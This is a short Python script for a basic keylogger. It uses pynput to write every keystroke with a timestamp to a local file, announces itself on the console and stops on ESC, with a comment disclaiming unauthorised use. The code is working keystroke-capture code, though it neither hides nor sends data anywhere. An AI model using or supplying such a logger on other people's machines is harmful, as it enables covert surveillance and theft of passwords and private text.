import pynput
import time
import os

# DISCLAIMER: This is for educational purposes only.
# Unauthorized use of keyloggers is illegal and unethical.
# Only use on systems you own or have explicit permission to monitor.

LOG_FILE = "keylog.txt"

def on_press(key):
    """Handle key press events"""
    try:
        # For regular character keys
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Key pressed: {key.char}\n"
    except AttributeError:
        # For special keys (space, enter, etc.)
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Special key: {str(key)}\n"
    
    # Write to log file
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def on_release(key):
    """Handle key release events"""
    # Stop the listener when ESC key is pressed
    if key == pynput.keyboard.Key.esc:
        print("\nKeylogger stopped. Log saved to:", os.path.abspath(LOG_FILE))
        return False

def start_keylogger():
    """Start the keylogger"""
    print("Basic Keylogger Started")
    print("Press ESC to stop logging")
    print("Keystrokes will be saved to:", os.path.abspath(LOG_FILE))
    print("-" * 50)
    
    # Create or clear log file
    with open(LOG_FILE, "w") as f:
        f.write(f"Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("-" * 50 + "\n")
    
    # Set up the listener
    with pynput.keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()